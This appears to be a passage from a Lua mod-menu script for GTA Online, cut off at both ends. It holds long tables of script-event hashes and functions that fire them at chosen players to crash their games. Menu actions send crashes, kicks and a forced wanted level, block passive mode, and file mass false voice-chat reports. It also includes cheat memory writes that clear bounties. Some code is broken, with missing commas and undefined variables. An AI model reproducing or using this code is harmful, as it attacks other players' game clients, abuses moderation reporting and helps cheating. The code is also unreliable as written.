-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}

local candycrashes = {
69874647, -- Currupt Events Added :)
924535804,
1494472464,
-1991317864,
1902624891,
127278285,
-195247709,
-1322571352,
704979198,
-1970125962,
2112408256,
677240627,
-2113023004,
-1704141512,
962740265,
-1386010354,
603406648,
-1715193475,
1258808115,
998716537,
163598572,
-1056683619,
-393294520,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}


function Huhcrash(pid) 
	for i,v in ipairs(crashes) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end

function Curruptcrash(pid) 
	for i,v in ipairs(crash) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end


local resolves = {
	"Hahaha",
	"Bitch!",
    "Whatever Fuck This! :P"
}

--[[function KickV1(pid, repeats) -- works
	for i = 1, repeats do
		for i,v in ipairs(kicks_fast_legacy) do
			arg = math.random(461950868, 999999999)
                                                            arg = math.random(-2^61, 2^62)
			send_script_event(v, pid, {pid, arg, arg})
			util.yield()
		end
	end
end]]


drift = false
function drift(toggle)

	if drift then
		while true do
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
        					VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        					VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
			util.yield()
		end
	end
end

selectedplayer = {}
for b = 0, 31 do
    selectedplayer[b] = false
end
excludeselected = false

--[[function list_players(list_id)
	for pid = 0, 31 do
		if players.exists(pids) then
			menu.toggle(list_id, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "", function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end
end]]


cmd_id = {}
for i = 0, 31 do
	cmd_id[i] = 0
end

local checkbruhmoment = menu.get_activation_key_hash()

local chaos, gravity, speed = false, true, 100

	menu.divider(custselc, "Slap Man")

	--[[menu.action(custselc, "Orbliterate", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					do_fade_in(pids)
					util.yield(3000)
					orbital(pids)
					util.yield(1000)
					do_fade_out(pids)

				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					do_fade_in(pids)
					util.yield(3000)
					orbital(pids)
					util.yield(1000)
					do_fade_out(pids)
				end
			end
		end
	end)]]



	menu.action(custselc, "Ban Voice Chat", {}, "May lag your game when in progress", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)


	menu.action(custselc, "Block Pussive", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 1})
                    send_script_event(1859990871, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 1})
                    send_script_event(1859990871, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)
    menu.action(custselc, "Unblock Pussive", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 0})
                    send_script_event(2033772643, pids, {pids, 0})
					util.yield()
					notification("Unblock Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 0})
                    send_script_event(2033772643, pids, {pids, 0})
					util.yield()
					notification("Unblock Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)


	menu.action(custselc, "Vehicle Kick", {}, "", function()
    	notification("Ooopsy vehicle kicked " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
					menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
					menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)


	menu.action(custselc, "CEO Ban", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ceoban" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ceoban" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)
	menu.action(custselc, "Next Gen Crash", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ngcrash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Next Gen Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ngcrash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Next Gen Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

	menu.action(custselc, "Give Wanted", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("givewanted" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Give Wanted has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("givewanted" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Give Wanted has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

	menu.action(custselc, "Steamroller Crash", {}, "", function()
    	notification("Sending Steamroller Crash crash to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Currupt Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Steamroller Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

    	menu.action(custselc, "Desync Kick", {"desynckick"}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("desynckick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Get fucked off " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("desynckick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Get fucked off " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

	menu.action(custselc, "Block Kick", {}, "Blocks Joins And Kicks Them.", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("block" .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("block" .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			end
		end
	end)

	menu.action(custselc, "Join Block Player", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			end
		end
	end)

	menu.divider(custselc, "GG's")

	for pids = 0, 31 do
		if players.exists(pids) then
			cmd_id[pids] = menu.toggle(custselc, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "PID - ".. pids, function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end


	protex = menu.list(menu.my_root(), "Stop Net Shit", {}, "", function(); end)
    	local pidsacam = menu.list(protex, "Anti Crash Camera", {}, "")

	local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
	local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
	local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
	local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")

	menu.action(pidsacam, "Anti Crash Camera On", {"acam"}, "Activates ped regen, invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and blocks all connections", function()
		notification("Toggling Anti Crash Camera On", colors.blue)
		util.toast("Note: Your camera is free to fly around :)")
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpfemale")

			menu.trigger_commands("invisibility" .. " On")
			menu.trigger_commands("levitate" .. " On")
			menu.trigger_commands("freecam" .. " On")
			menu.trigger_commands("potatomode on")
    			menu.trigger_commands("nosky on")
			menu.trigger_commands("reducedcollision" .. " On")
			menu.trigger_commands("nocollision" .. " On")
			menu.trigger_commands("showcamall" .. " On")
			menu.trigger_commands("confuseall" .. " On")
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
    	local player_ped = PLAYER.PLAYER_PED_ID()    
    	local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    	local pld = PLAYER.GET_PLAYER_PED(pid)
    	local pos = ENTITY.GET_ENTITY_COORDS(pld)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
    			util.yield(1000)
    		for i=1,4  do
        			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
        			util.yield(1000)
    			end
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
		end
	
	end)

	menu.action(pidsacam, "Anti Crash Camera Off", {"acamoff"}, "Deactivates ped regen,invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and unblocks all connections", function()
		notification("Toggling Anti Crash Camera Off", colors.blue)
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
			end
		notification("Force Stopped All Sound Events", colors.green)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
		notification("Removed Attachments", colors.green)
			menu.trigger_commands("mpfemale")
    	local player_ped = PLAYER.PLAYER_PED_ID()    
    	local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    	local pld = PLAYER.GET_PLAYER_PED(pid)
    	local pos = ENTITY.GET_ENTITY_COORDS(pld)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.40393, -819.56366, 326.17517)
    			util.yield(1000)
    		for i=1,4  do
        			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.40393, -819.56366, 326.17517)
        			util.yield(1000)
    			end
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
			menu.trigger_commands("invisibility" .. " Off")
			menu.trigger_commands("levitate" .. " Off")
			menu.trigger_commands("freecam" .. " Off")
			menu.trigger_commands("potatomode off")
    			menu.trigger_commands("nosky Off")
			menu.trigger_commands("reducedcollision" .. " Off")
			menu.trigger_commands("nocollision" .. " Off")
			menu.trigger_commands("showcamall" .. " Off")
			menu.trigger_commands("confuseall" .. " Off")
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
		end
	
	end)


local anti_bounty = menu.list(protex, "Anti-Bounty's")

menu.action(anti_bounty, "Anti-Bounty", {"bountyoff"}, "Turns off bounty's.", function()
if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
 memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
 memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
else
    util.toast("You don't currently have a bounty bitch! xD.")
    end
end)

menu.toggle_loop(anti_bounty, "Anti-Bounty's", {"bountysoff"}, "Turns off bounty's. Keep toggled if bounty's persist", function()
if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
 memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
 memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
else
    end
end)


	protexx = menu.list(protex, "Clear All Notifications", {}, "", function(); end)

	menu.action(protexx, "Clear All Notifications", {"clearnotifs"}, "Clears stand notifs and above mini map", function()
			menu.trigger_commands("clearnotifications")
			menu.trigger_commands("clearstandnotifys")
	end)



	menu.toggle_loop(protexx, "Clear All Notifications Toggled", {"toggleclearnotifs"}, "Clears stand notifs and above mini map", function(on_toggle)
		if on then
			menu.trigger_commands("clearnotifications")
			menu.trigger_commands("clearstandnotifys")
			util.yield(1000)
		else
			menu.trigger_commands("clearnotifications")
			menu.trigger_commands("clearstandnotifys")
		end
	
	end)

	menu.action(protex, "Force Stop all sound events", {"stopsounds"}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)

	menu.action(protex, "Remove Attachments", {"remove attachments"}, "Cleans your ped of all attachments by regenerating it", function()
		notification("Removing Attachments", colors.red)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpmale")
		else
			menu.trigger_commands("mpfemale")
		end
	
	end)

	menu.click_slider(protex,"Clear Shit Up", {"superc"}, "5 = peds, 4 = vehicles, 3 = objects, 2 = pickups, 1 = all \nNote: This excludes players and their vehicles.", 1, 5, 1, 1, function(on_change)
		if on_change == 5 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
		end
		if on_change == 4 then
			local count = 0
			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			return
		end
		if on_change == 3 then
			local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			return
		end
		if on_change == 2 then
			local count = 0
			for k, ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			return
		end
		if on_change == 1 then
			local count = 0
			for k, ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		


			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			return
		end
	end)

	menu.action(protex, "Super Clean Shit", {"clean"}, "Attempt to fuck every single entity without exception. Not recommended but fuck it", function(on_click)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("Pooped all vehicles!")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		util.toast("Shagged all peds AUUUUUGGH!!!")
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
		util.toast("Gobbled all pickups nom nom!")
		util.toast("Fucked Everything off " .. ct .. " Entities removed. :)")
		notification("Shit cleaned nom nom > " .. ct .. "Entities", colors.green)
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				util.yield()
			return
		end
	end)


menu.toggle_loop(protex, "Block Transaction Error 'Test'", {}, "Likely to lead to errors, use under responsibility", function(on_toggle)
    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Notification")
    if on_toggle then
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 100 do
            menu.trigger_commands("removeloader")
        end
        util.toast("It's not my fault the log error, wait for Stand to fix it")
    end
end)

	menu.toggle_loop(protex, "No Entity Spawn", {"noentities"}, "De spawns all entites.", function(on_loop)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
